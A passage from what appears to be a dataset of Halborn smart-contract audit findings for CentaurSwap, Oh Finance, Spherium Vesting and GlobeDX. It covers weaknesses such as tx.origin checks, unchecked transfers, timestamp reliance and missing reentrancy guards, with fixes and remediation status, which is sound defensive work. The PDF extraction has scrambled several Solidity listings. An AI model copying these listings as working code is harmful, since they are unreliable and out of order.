protection modifier onlyEOA(msg.sender) is present and used on multiple places, only whitelisted contracts are allowed to interact with it: Listing 28 1 modifier onlyEOA ( address _address ) { 2 3 if ( onlyEOAEnabled ) { require ((! Address . isContract ( _address ) || G N I T S E T L A U N A M whitelistContracts [ _address ]) , ' CentaurSwap : ONLY_EOA_ALLOWED '); 4 5 6 } _ ; } 4.4 Settlements It does not validate that the caller is the pool, so a user can addSettlement and removeSettlement. 35 is not It removeSettlement, which would allow a bypass of the settlement system: settlements possible pending remove that are to on Listing 29 1 require ( block . timestamp >= pendingSettlement [ _sender ][ _fPool ]. settlementTimestamp , ' CentaurSwap : SETTLEMENT_PENDING '); It does not allow modifying a settlement during the addSettlement function, which would allow decreasing the settlement time or even invalidating it: Listing 30 1 require ( pendingSettlement [ _sender ][ _pendingSettlement . fPool ]. settlementTimestamp == 0 , ' CentaurSwap : SETTLEMENT_EXISTS '); 2 require ( pendingSettlement [ _sender ][ _pendingSettlement . tPool ]. settlementTimestamp == 0 , ' CentaurSwap : SETTLEMENT_EXISTS '); 4.5 Helpers  safeTransferETH is used at the end of the functions after updating the status 4.6 WheyFarm  400 WHEY per block during the early-adopter period of 16th April 2021 to 19th April 2021  100 WHEY per block from 19th April 2021 to 16th May 2021  Reduction of 10 WHEY per block monthly for the next eight months  Reduction of 10% every month until 16th May 2024  1 WHEY per block until 16th August 2026 The scheme is implemented in scripts/emissionPerEpoch.json, the output is shown in Figure 11. 36 G N I T S E T L A U N A M Figure 11: Emission used as described on the documentation Trying a deposit successfully updates the balance on the internal structs as shown in Figure 12.  totalAllocPoint should be required to be greater than zero or a division by zero error may be triggered, as shown in Figure 13. Listing 31 1 WheyFarm . pendingWhey ( uint256 , address ) ( contracts / WheyFarm . sol 2 #177 -195) performs a multiplication on the result of a division : - accWheyPerShare = accWheyPerShare . add (( poolWheyReward . mul (85) . div (100) ). mul (1 e12 ). div ( lpSupply )) ( contracts / WheyFarm . sol #190 -192) 3 WheyFarm . updatePool ( uint256 ) ( contracts / WheyFarm . sol #206 -258) performs a multiplication on the result of a division : - poolWheyReward = wheyReward . mul ( pool . allocPoint ). div ( 4 totalAllocPoint ) ( contracts / WheyFarm . sol #232) 5 - devReward = poolWheyReward . mul (15) . div (100) ( contracts / WheyFarm . sol #235) 37 G N I T S E T L A U N A M Figure 12: Successfully updating internal structs G N I T S E T L A U N A M Figure 13: Missing bigger than 0 check on totalAllocPoint is causing division by zero errors 38 6 Reference : https : // github . com / crytic / slither / wiki / Detector - Documentation # divide - before - multiply The fees given to the devs are exactly 15%, as shown in Figure 14. Figure 14: Math operation demonstrating that the percentage given to the devs is 15% It correctly calculates the block reward based on block numbers, init and end values, shown in Figure 15. Figure 15: Rewarded whey based on init and end block numbers G N I T S E T L A U N A M 39 Figure 16: values and fee percentages Correctly calculating withdraw amounts based on internal G N I T S E T L A U N A M 40 ", "labels": ["Halborn", "CentaurSwap", "Severity: Informational"]}, {"title": "USE OF TX.ORIGIN", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Oh_Finance_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "OhBank.sol contract use tx.origin so that defense modifier can be called by anybody. It is recommended that you use msg.sender instead of tx.origin because if a transaction is made to a malicious wallet, when you check it you will have the origin address and you will not be able to know the address of the malicious wallet. Nevertheless, the use of tx.origin is semi-legitimized for recording who calls the contract most. Furthermore, tx.origin could be used to prevent an address from interacting with your contract because the owner of the address cannot use the contract as an intermediary to circumvent your blocking. Finally, it is important to remark that the use of tx.origin will be deprecated. Code Location: OhBank.sol Line #37 Listing 1: OhBank.sol (Lines 38) 37 38 39 40 modifier defense { require ( msg . sender == tx . origin || IManager ( manager () ). whitelisted ( msg . sender ) , \" Bank : Only EOA or whitelisted \" ); _ ; } Risk Level: Likelihood - 3 Impact - 4 13 Recommendation: It is recommended not to use tx.origin because a malicious wallet could receive funds and cannot be tracked. However, its use is semi-legitimate in some cases with caution. Remediation Plan: This modifiers purpose is to prevent smart contracts from interacting with the Bank contract (i.e. malicious attacks). The only time that tx.origin == msg.sender is when the top-level caller is a user, not a contract. The OpenZeppelin implementation of the Address library is not sufficient for identifying whether an address is NOT a contract, therefore this is the only form of logic currently available in Solidity that accurately blocks contract interaction. Contracts are upgradeable and logic can be updated if EIP-3074 is passed and implemented. The issue is reclassified to LOW. 14 ", "labels": ["Halborn", "Oh_Finance", "Severity: Medium"]}, {"title": "UNCHECKED TRANSFER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Oh_Finance_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "The contracts OhBank.sol has _deposit method and in this method, transferFrom() is being called without any implementing checks on the return value. Several tokens do not revert in case of failure and return false which may allow an attacker to deposit for free. Code Location: Listing 2: OhBank.sol (Lines 225) // deposit underlying to receive shares function _deposit ( uint256 amount , address sender , address recipient ) internal { require ( totalStrategies () > 0, \" Bank : No Strategies \" ); require ( amount > 0, \" Bank : Invalid Deposit \" ); uint256 totalSupply = totalSupply () ; uint256 mintAmount = totalSupply == 0 ? amount : amount . mul ( totalSupply ). div ( virtualBalance () ); _mint ( recipient , mintAmount ); IERC20 ( underlying () ). transferFrom ( sender , address ( this ) , amount ); emit Deposit ( recipient , amount ); } 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 15 Risk Level: Likelihood - 1 Impact - 3 Recommendation: Although using SafeERC20 for IERC20; is used we recommend using safe- TransferFrom() instead of the transferFrom() function. Remediation Plan: Updated SOLVED: SafeERC20. safeTransferFrom method. This method will cause any ERC20 to revert in case of failure. Fixed in coomit ID: d7ef893c0377d347b9730e724d70b5c7e7b6f4a1 OpenZeppelin OhBank.sol use the to 16 ", "labels": ["Halborn", "Oh_Finance", "Severity: Low"]}, {"title": "USE OF BLOCK.TIMESTAMP", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Oh_Finance_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "During a manual static review, the tester noticed the use of block .timestamp in OhAaveV2Strategy.sol contract. The contract developers should be aware that this does not mean current time. Miners can influence the value of block.timestamp to perform Maximal Extractable Value (MEV) attacks. The use of now creates a risk that time manipulation can be performed to manipulate price oracles. Miners can modify the timestamp by up to 900 seconds. Code Location: Listing 3: OhAaveV2Strategy.sol (Lines 92,99) 87 // / @dev Compound stkAAVE rewards on a alternating cooldown 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 schedule function _compound () internal { uint256 currentCooldown = rewardCooldown () ; // if the current cooldown has passed if ( block . timestamp > currentCooldown ) { // save state variables uint256 balance = stakedBalance () ; address staked = stakedToken () ; uint256 expiration = currentCooldown . add ( unstakingWindow ( staked )) ; // if we have stkAAVE and the unstaking window hasn 't passed if ( balance > 0 && block . timestamp < expiration ) { // redeem all available AAVE redeem ( staked , balance ); // validate we received AAVE uint256 amount = rewardBalance () ; if ( amount > 0) { // liquidate for underlying 17 107 108 109 } } liquidate ( reward () , underlying () , amount ); Risk Level: Likelihood - 1 Impact - 3 Recommendation: Use block.number instead of block.timestamp to reduce the risk of MEV attacks. Check if the timescale of the project occurs across years, days and months rather than seconds. If possible, it is recommended to use Oracles. Remediation Plan: NOT APPLICABLE: The AaveV2Strategy.sol file only deals with time periods greater than 48 hours. There is a 480 hour waiting period that must first pass to convert stkAAVE into AAVE. Then there is a maximum 48 hour window in which the conversion can take place. Timeframes of this length should not be affected by miner manipulation. 18 ", "labels": ["Halborn", "Oh_Finance", "Severity: Low"]}, {"title": "MISSING EVENTS EMITTING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Oh_Finance_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "We observed that some critical functionality are missing emitting any events like exit and exitAll functions, the governance would probably want to monitor these operations Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider emitting an event when calling exit or exitAll function. Listing 4 1 event exit ( address strategy , uint256 amount ); 2 event exitAll ( address strategy ) Remediation Plan: SOLVED: Added event emitters for the recommended exit and exitAll methods. Added additional events where appropriate. Fixed in commit ID: 240 a1a261b7f3a9e11031f7a078557073bc7b07d 19 ", "labels": ["Halborn", "Oh_Finance", "Severity: Informational"]}, {"title": "MISSING RE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Oh_Finance_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "To protect against cross-function reentrancy attacks, it may be necessary to use a mutex. By using this lock, an attacker can no longer exploit the withdraw function with a recursive call. OpenZeppelin has its own mutex implementation called ReentrancyGuard which provides a modifier to any function called nonReentrant that guards the function with a mutex against reentrancy attacks. Code Location: Listing 5: OhBank.sol (Lines 197) // withdraw an amount of shares for underlying function withdraw ( uint256 shares ) external override defense { _withdraw ( msg . sender , shares ); } 196 197 198 199 200 Listing 6: OhCompoundStrategy.sol (Lines 87) // withdraw all underlying by redeem all cTokens function withdrawAll () external override onlyBank { uint256 invested = investedBalance () ; _withdraw ( msg . sender , invested ); } 86 87 88 89 90 91 Listing 7: OhAaveV2Strategy.sol (Lines 76) 75 76 77 78 // / @notice function withdraw ( uint256 amount ) external override onlyBank returns ( uint256 ) { uint256 withdrawn = _withdraw ( msg . sender , amount ); return withdrawn ; 20 } 79 80 Risk Level: Likelihood - 1 Impact - 1 Recommendation: In the OhBank.sol , OhCompoundStrategy.sol , OhCurve3PoolStrategy.sol and OhAaveV2Strategy.sol contract, function like withdraw() and withdrawAll (), are missing nonReentrant guard. Use the nonReentrant modifier to avoid introducing future vulnerabilities. Remediation Plan: RISK ACCEPTED: Oh!Finance team claims that no changes are necessary. The defense modifier prevents re-entrancy attacks. Since only top-level users can call these functions, it is not possible to execute any code on callbacks. 21 ", "labels": ["Halborn", "Oh_Finance", "Severity: Informational"]}, {"title": "IMPRECISION OF A CONSTANT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Oh_Finance_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "During the audit, It has been observed that integers with scientific notations are directly compared with function arguments. Code Location: OhCompoundStrategy.sol Lines #56,100,101 OhCurve3PoolStrategy.sol Lines #120,123,126 Listing 8: OhCurve3PoolStrategy.sol (Lines ) 120 121 122 123 124 125 126 uint256 supplyShare = amount . mul (1 e18 ). div ( invested ); // find amount to unstake in 3 CRV uint256 unstakeAmount = Math . min ( staked , supplyShare . mul ( staked ). div (1 e18 )) ; // find amount to redeem in underlying uint256 redeemAmount = Math . min ( invested , supplyShare . mul ( invested ). div (1 e18 )) ; Recommendation: It is recommended to define precision values as a constant value at the beginning of contract. Listing 9 1 uint constant PRECISION = 1 e18 ; 22 Remediation Plan: ACKNOWLEDGED: Oh!Finance team claims that no changes are necessary. Declaring constant variables in proxy contracts introduces upgrade risks and usage of the memory stack is cheaper than referencing stored vari- ables. 23 ", "labels": ["Halborn", "Oh_Finance", "Severity: Informational"]}, {"title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Oh_Finance_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "In public functions, array arguments are immediately copied to memory, while external functions can read directly from calldata. Reading call- data is cheaper than memory allocation. Public functions need to write the arguments to memory because public functions may be called internally. Internal calls are passed internally by pointers to memory. Thus, the function expects its arguments being located in memory when the compiler generates the code for an internal function. Code Location: Listing 10: OhBank.sol (Lines 118) 118 119 120 121 122 function virtualPrice () public view override returns ( uint256 ) { uint256 totalSupply = totalSupply () ; uint256 unit = 10** decimals () ; return totalSupply == 0 ? unit : virtualBalance () . mul ( unit ). div ( totalSupply ); } Listing 11: OhAaveV2Strategy.sol (Lines 56) 56 57 58 function investedBalance () public view override returns ( uint256 ) { return derivativeBalance () ; } Risk Level: Likelihood - 1 Impact - 1 24 Recommendation: Consider declaring external variables instead of public variables. A best practice is to use external if expecting a function to only be called externally and public if called internally. Public functions are always accessible, but external functions are only available to external callers. Remediation Plan: ACKNOWLEDGED: Oh!Finance team claims that functions were intentionally left public. While the Bank and Strategy contracts have upgradeable proxy implementation prevents changing function signatures. logic, Leaving functions marked as public adds the least restrictions for (e.g. We mark virtualPrice() as external and later future upgrades. want to push an upgrade that uses virtualPrice() in a calculation, this cannot be done without duplicating code). 25 ", "labels": ["Halborn", "Oh_Finance", "Severity: Informational"]}, {"title": "LACK OF LIQUIDITY LOSS PROTECTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Oh_Finance_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "The exit and exitAll functions allows the bank owner to transfer the deposited amounts to their account. These situations are often enabled because a single bank role, or a liquidity address has access to remove all the TVL (Total Value Locked) through a withdraw or transfer function. While sometimes, the developer or owner does not intend to do this malicious act, the risk still exists if the private key is stolen since there is nothing preventing the key-holder from calling the withdraw. Code Location: Listing 12: OhBank.sol (Lines ) 120 121 122 123 124 125 126 127 128 129 // / @notice Exit and withdraw a given amount from a strategy // / @param strategy The address of the Strategy to exit function exit ( address strategy , uint256 amount ) external override onlyAuthorized { IStrategy ( strategy ). withdraw ( amount ); } // / @notice Exit and withdraw all underlying from a given strategy function exitAll ( address strategy ) external override onlyAuthorized { IStrategy ( strategy ). withdrawAll () ; } Recommendation: Those functions allows the banks of the system to perform withdraw all amounts from strategy addresses. The bank should be limited to the minimum operations possible that allows pool management. Oh!Finance does only use the onlyBank and onlyAuthorized modifier , the bank role check to perform 26 critical actions such as enabling transfers on the strategies. However, these functionalities should be split between multiple role based users with multi-signature wallets for each one. Also, It is recommended to add timelock or pause/unpause functionality on the withdraw progress. The latency introduced by time locks can act as a preview for how things might work under the unexpected situations. ### Remediation Plan *RISK ACCEPTED* Oh!Finance team claims that no change are necessary. The onlyAuthorized modifier allows either the Manager or Governance address to perform a Strategy exit. Strategy exits do not allow either of these addresses to withdraw user funds, only the withdrawal from a specific Strategy to the Bank address. Funds then sit on the Bank contract and can be withdrawn by burning Bank tokens as usual. The Manager address will always be a contract. During the initial deployment, the Governance address will be set to the deployer, but will then be updated to a DAO These functions were written to facilitate normal Timelock Contract. interactions between the Banks and Strategies, allow any upgrades, and allow any emergency actions to be taken by Governance in the case of an underlying protocol failure. 27 MANUAL TESTING 28 During the manual testing multiple questions where considered while evaluation each of the defined functions:  Can it be re-called changing admin/roles and permissions?  Can somehow an external controlled contract call again the function during the execution of it? (Re-entrancy)  Can it be called twice in the same block and cause issues?  Do we control sensitive or vulnerable parameters?  Does the function check for boundaries on the parameters and internal values? Bigger than zero or equal? Argument count, array sizes, integer truncation . . .  Are the function parameters and variables controlled by external contracts?  Can we re-initialize contracts?  Can we withdraw more than allowed? G N I T S E T L A U N A M 29 4.1 Testing if contracts could be reinitialized again. Custom tests are useful for developers to check if functions and Furthermore, they are also useful for permissions work correctly. security auditors to perform security tests behaving like a malicious user. Then, auditors manually manipulated inputs to check the security in the smart contracts. Contracts are deployed using a proxy, its essential to test if the initializer modifier exists and prevent deploying the contract again and possibly gain ownership to the contract by attackers. , OhBank.sol s OhCurve3PoolStrategy.sol using OpenZeppelin. Moreover , manually redeploying again will give revert. OhCompoundStrategy.sol initializer OhAaveV2Strategy.sol are modifier , the and from Listing 13: OhBank.sol (Lines 43,59) } assert ( registry () == address (0) ) ; assert ( underlying () == address (0) ) ; 42 // / @notice Initialize the Bank Logic 43 constructor () initializer { 44 45 46 47 48 49 50 51 52 // / @notice Initialize the Bank Proxy // / @param name_ The name of the Bank Token // / @param symbol_ The symbol of the Bank Token // / @param registry_ Rhe address of the registry // / @param underlying_ Rhe address of the underlying token that is deposited // / @dev Should be called when deploying the proxy contract function initializeBank ( string memory name_ , string memory symbol_ , address registry_ , address underlying_ ) public initializer { 53 54 55 56 57 58 59 60 30 G N I T S E T L A U N A M Initialization Check G N I T S E T L A U N A M 31 4.2 Testing For Function Clashing. The DAPP is using proxy to allow quick bug-fixing and adding new features on top of already deployed contracts. its essential to know in such design its possible to conceal malicious code that can be very difficult to spot. Function clashing happens when any function in the Proxy contract whose selector matches with one in the implementation contract will be called directly, completely skipping the implementation code, function selector is the first four bytes of the sha3 of the function signature. therefore we used slither plugin slither-check-upgradeability to ensure that there is no such clashing between the contracts in scope and the proxy contract. Function Clashing Test G N I T S E T L A U N A M 32 4.3 Testing For Roles And Privilege. In this test, it is tried to call critical functions such as exit() and exitAll() to withdraw all funds from strategies. It is observed that access control is correctly implemented and most critical function was either internal or can be only called by Banks or Governors. Exit/ExitAll Function Privilege Check Pause/Unpause Function Privilege Check G N I T S E T L A U N A M 33 Strategy Functions Privilege Check G N I T S E T L A U N A M 34 4.4 Testing For Burning More Tokens Than owned. In this test, it is tried to burn more tokens than a user owned through the withdraw function, there were no checks to ensure the balance of the owner before calling the _burn method, however the _burn will automatically revert if the amount to be burned is more than his balance. we still recommend adding a require statement to ensure the user has enough balance before calling the burn function to optimize gas usage. Withdraw Testing G N I T S E T L A U N A M 35 4.5 Testing Deposit with Signature During the test, depositWithPermit function is evaluated. The signature is created with another address. To sum up, The manipulation was not successful on the contract. Test results can be seen from the below. G N I T S E T L A U N A M 36 ", "labels": ["Halborn", "Oh_Finance", "Severity: Informational"]}, {"title": "USAGE OF BLOCK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Spherium_Vesting_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Code Location: SphrVestingStatic.sol During a manual review, usage of block.timestamp in SphrVestingStatic. sol and SphrVesting.sol were observed. The contract developers should now is an alias for be aware that this does not mean current time. block.timestamp. The value of block.timestamp can be influenced by miners to a certain degree, so the testers should be warned that this may have some risk if miners collude on time manipulation to influence the price oracles. Miners can influence the timestamp by a tolerance of 900 seconds. D R A F T } vestedAmount_ = vestedAmount_ . sub ( _releaseAmount [ msg . uint256 vestedAmount_ ; for ( uint256 i =0; i < vestingSchedules_ . length ; i ++) { function vestedAmount () public view virtual returns ( uint256 ) { if ( vestingSchedules_ [ i ]. schedule < block . timestamp ) { Listing 2: SphrVestingStatic.sol (Lines 45) vestedAmount_ = vestingSchedules_ [i ]. amount . add ( VestingSchedule [] memory vestingSchedules_ = _vestingSchedules [ msg . sender ]; return vestedAmount_ ; vestedAmount_ ); sender ]) ; 40 41 42 43 44 45 46 47 48 49 50 51 52 } } SphrVestingStatic.sol 12 Listing 3: SphrVestingStatic.sol (Lines 59) function claim () public returns ( bool ) { VestingSchedule [] memory vestingSchedules_ = _vestingSchedules [ msg . sender ]; if ( vestingSchedules_ [ i ]. schedule < block . timestamp ) { _releaseAmount [ msg . sender ]. } sender ]) ; return true ; vestedAmount_ ); add ( vestedAmount_ ); delete vestingSchedules_ [i ]; amount must be greater then 0 \" ); vestedAmount_ = vestingSchedules_ [i ]. amount . add ( require ( vestedAmount_ > 0, \" SphrVestingStatic : vested _token . safeTransfer ( msg . sender , vestedAmount_ ); _releaseAmount [ msg . sender ] = uint256 vestedAmount_ ; for ( uint256 i =0; i < vestingSchedules_ . length ; i ++) { } vestedAmount_ = vestedAmount_ . sub ( _releaseAmount [ msg . D R A F T // uint256 totalBalance = currentBalance . add ( _released [ } else if ( block . timestamp >= _start . add ( _duration )) { if ( block . timestamp < _cliff ) { return _share [ msg . sender ]; address ( token ) ]) ; return 0; ) ; // uint256 currentBalance = _token . balanceOf ( address ( this ) } else { Listing 4: SphrVesting.sol (Lines 90,92) function _vestedAmount () private view returns ( uint256 ) { } SphrVesting.sol 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 86 87 88 89 90 91 92 93 94 95 96 97 return _share [ msg . sender ]. mul ( block . timestamp . sub ( _start )) . div ( _duration ); } } 13 Risk Level: Likelihood - 2 Impact - 3 Recommendation: Remediation Plan: RISK ACCEPTED: Spherium team accepts this risk. Use block.number instead of block.timestamp or now to reduce the risk of MEV attacks. Check if the timescale of the project occurs across years, days and months rather than seconds. If possible, it is recommended to use Oracles. D R A F T 14 ", "labels": ["Halborn", "Spherium_Vesting", "Severity: Low"]}, {"title": "FLOATING PRAGMA", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Spherium_Vesting_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Code Location: Listing 5: (Lines 1) 1 pragma solidity ^0.6.12; 2 } Vesting interfaces contract ISph.sol and ITimelock.sol uses the floating pragma 0.6.12. Contract should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, either an outdated compiler version that might introduce bugs that affect the contract system negatively or a pragma version too new which has not been extensively tested. D R A F T Consider locking the pragma version with known bugs for the compiler When possible, do not use floating pragma in the final live version. deployment. Specifying a fixed compiler version ensures that the bytecode produced does not vary between builds. This is especially important if you rely on bytecode-level verification of the code. Likelihood - 1 Impact - 3 Recommendations: Risk Level: 15 Remediation Plan: SOLVED: c2394c97f6a29858bebf316663cf393f9400593b. Spherium team locked the pragma version in commit D R A F T 16 ", "labels": ["Halborn", "Spherium_Vesting", "Severity: Low"]}, {"title": "MISSING EVENTS EMITTING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Spherium_Vesting_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Code Location: Listing 6: Missing Events It has been observed that important functionality is missing emitting event for some functions on the SphrVestingStatic.sol contract. These functions should emit events. 1 function claim () public returns ( bool ) 2 function vestedAmount () public view virtual returns ( uint256 ) 3 function addVestingSchedule ( address benificiary , uint256 amount , uint256 schedule ) public onlyOwner returns ( bool ) D R A F T 4 Risk Level: Likelihood - 1 Impact - 2 Recommendations: Remediation Plan: Consider emitting an event when calling related functions on the list above. ACKNOWLEDGED: Spherium team acknowledges this issue. 17 ", "labels": ["Halborn", "Spherium_Vesting", "Severity: Informational"]}, {"title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Spherium_Vesting_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Code Location: In public functions, array arguments are immediately copied to mem- ory, while external functions can read directly from calldata. Reading Public functions need to calldata is cheaper than memory allocation. write the arguments to memory because public functions may be called internally. Internal calls are passed internally by pointers to memory. Thus, the function expects its arguments being located in memory when the compiler generates the code for an internal function. Also, methods do not necessarily have to be public if they are only called within the contract-in such case they should be marked internal. D R A F T SphrVestingStatic: tokenContract, addVestingSchedule, vestedAmount, claim, getBlockTimes- tamp SphrVesting: getReleased, getShare, getBlockTimestamp, release Below are smart contracts and their corresponding functions affected: Likelihood - 1 Impact - 1 Risk Level: Recommendation: Consider as much as possible declaring external variables instead of public variables. As for best practice, you should use external if you 18 expect that the function will only be called externally and use public if you need to call the function internally. To sum up, all can access to public functions, external functions only can be accessed externally and internal functions can only be called within the contract. Remediation Plan: ACKNOWLEDGED: Spherium team acknowledges this issue. D R A F T 19 ", "labels": ["Halborn", "Spherium_Vesting", "Severity: Informational"]}, {"title": "IMPROPER ACCESS CONTROL POLICY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/GlobeDX_Smart_Contract_Audit_Halborn_v1_1.pdf", "body": "Implementing a valid access control policy is an essential step in main- taining the security of a smart-contract. All the features of the smart contract , such as add/remove roles and upgrade contracts are given by Access Control. For instance, Ownership is the most common form of Ac- cess Control. In other words, the owner of a contract (the account that deployed it by default) can do some administrative tasks on it. Addi- tional authorization levels are needed to implement the least privilege principle, also known as least-authority, which ensures only authorized processes, users, or programs can access the necessary resources or in- formation. The ownership role is useful in a simple system, but more complex projects require the use of more roles by using Role-based access control. In the GDT.sol contract, there is no authorization check on the burn function. Each user can burn their own balance on the related function. Code Location: GDT.sol Lines #56-66 GDT.sol Lines #56-66 13 Figure 1: Any user can burn their own balance. Risk Level: Likelihood - 4 Impact - 4 Recommendation: Its recommended to use role-based access control based on the principle of least privilege to lock permissioned functions using different role. In the other words, A white-listing should be applied on the burn function via access control policy. The access control policy of function may govern who can burn their balances. Reference: https://www.cyberark.com/what-is/least-privilege/ Remediation Plan: Solved: GlobeDX team included the initial address check in the function. 14 ", "labels": ["Halborn", "GlobeDX", "Severity: High"]}, {"title": "LACK OF OVERFLOW PROTECTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/GlobeDX_Smart_Contract_Audit_Halborn_v1_1.pdf", "body": "In the GDT.sol functions, The contract does not perform any precondition checks on the function arguments. Code Location: GDT.sol Lines #20-27 GDT.sol Lines #42-54 GDT.sol Lines #56-66 15 GDT.sol Lines #68-77 GDT.sol Lines #79-87 Risk Level: Likelihood - 3 Impact - 3 Recommendation: A contract should consider using the OpenZeppelin SafeMath library on the decimal calculations and should perform a precondition check to prevent an overflow. Reference: https://docs.openzeppelin.com/contracts/2.x/api/math Remediation Plan: Solved: GlobeDX team will use pragma version 0.8.4. 16 ", "labels": ["Halborn", "GlobeDX", "Severity: Medium"]}, {"title": "LACK OF ADDRESS CONTROL ON THE FUNCTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/GlobeDX_Smart_Contract_Audit_Halborn_v1_1.pdf", "body": "Address validation in contract GDT.sol is missing. validation has been found in the multiple functions. Lack of address Code Location: GDT.sol Lines #14-18 GDT.sol Lines #20-27 GDT.sol Lines #35-42 17 GDT.sol Lines #42-54 Risk Level: Likelihood - 2 Impact - 3 Recommendation: Add proper address validation when assigning a value to a variable from user supplied inputs. As a better solution, a white-listing/black-listing should be applied on the related functions. Listing 1 1 2 3 4 5 6 modifier validAddress ( address addr ) { require ( addr != 0 , \" Value can not be null \") ; require ( addr != address (0) , \" Address cannot be 0 x0 \") ; require ( addr != address ( this ) , \" Address cannot be contract address \") ; _; } Remediation Plan: Solved: GlobeDX team completed address check on the related functions. 18 ", "labels": ["Halborn", "GlobeDX", "Severity: Low"]}, {"title": "OUTDATED OPENZEPPELIN CONTRACT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/GlobeDX_Smart_Contract_Audit_Halborn_v1_1.pdf", "body": "The GDT contract used outdated version of the OpenZeppelin contract and was written for Solidity 0.4.21. Even though this outdated version does not pose any high-risk vulnerabilities, some of function implementations have since changed, which may lead to GlobeDX being incompatible. GDT.sol Lines #68-88 https://github.com/OpenZeppelin/openzeppelin-contracts/ Reference: issues/437 Reference: https://ethereum.org/tr/developers/tutorials/erc20-annotated-code/ Risk Level: Likelihood - 1 Impact - 1 19 Recommendation: The OpenZeppelin contract should be updated to latest stable version for being compatible with modern ERC-20 tokens. Remediation Plan: Risk Accepted: the GlobeDX team has decided to use the older version of ERC20 token. 20 ", "labels": ["Halborn", "GlobeDX", "Severity: Informational"]}, {"title": "PRAGMA VERSION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/GlobeDX_Smart_Contract_Audit_Halborn_v1_1.pdf", "body": "GDT.sol uses one of the latest pragma version (0.8.3) which was released on March 23, 2021. The latest pragma version (0.8.4) was released in April 2021. Many pragma versions have been lately released, going from version 0.6.x to the recently released version 0.8.x. in a short time. Code Location: GDT.sol Line #~1 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider if possible, using a stable pragma version (0.6.12-0.7.3) that has been well tested to prevent potential undiscovered vulnerabilities. Reference: https://github.com/ethereum/solidity/blob/develop/docs/bugs_ by_version.json 21 Remediation Plan: Risk Accepted: GlobeDX team considers the use of pragma 0.8.4 appropriate for the deployment to the mainnet. 22 ", "labels": ["Halborn", "GlobeDX", "Severity: Informational"]}, {"title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/GlobeDX_Smart_Contract_Audit_Halborn_v1_1.pdf", "body": "In public functions, array arguments are immediately copied to memory, while external functions can read directly from calldata. Reading call- data is cheaper than memory allocation. Public functions need to write the arguments to memory because public functions may be called internally. Internal calls are passed internally by pointers to memory. Thus, the function expects its arguments being located in memory when the compiler generates the code for an internal function. Code Location: Listing 2 1 function transfer 2 function transferFrom 3 function burn 4 function increaseAllowance 5 function decreaseAllowance Risk Level: Likelihood - 1 Impact - 1 Recommendation: A Consider declaring external variables instead of public variables. best practice is to use external if expecting a function to only be called externally and public if called internally. Public functions are always accessible, but external functions are only available to external callers. 23 Remediation Plan: Solved: GlobeDX team marked functions as an external. 24 ", "labels": ["Halborn", "GlobeDX", "Severity: Informational"]}, {"title": "NO TEST COVERAGE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/GlobeDX_Smart_Contract_Audit_Halborn_v1_1.pdf", "body": "Unlike other software programs, smart contracts can not be modified or removed if deployed once into a specific address except if you deploy them with a proxy contract. Checking the code by automated testing (unit testing or functional testing) is a good practice to be sure all lines of the code work correctly. Mocha and Chai are useful tools to perform unit test in Smart Contracts functions. Mocha is a Javascript testing framework for creating both synchronous and asynchronous unit tests. Moreover, Chai is an assertions library with some interfaces such as assert, expect and should to develop custom unit tests. References: https://github.com/mochajs/mocha https://github.com/chaijs/chai https://docs.openzeppelin.com/learn/writing-automated-tests Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended considering to perform as much as possible test cases to cover all possible scenarios in the smart contract. 25 Remediation Plan: Solved: GlobeDX team implemented test cases via another framework. 26 3.8 STATIC ANALYSIS REPORT ", "labels": ["Halborn", "GlobeDX", "Severity: Informational"]}, {"title": "FUNDS 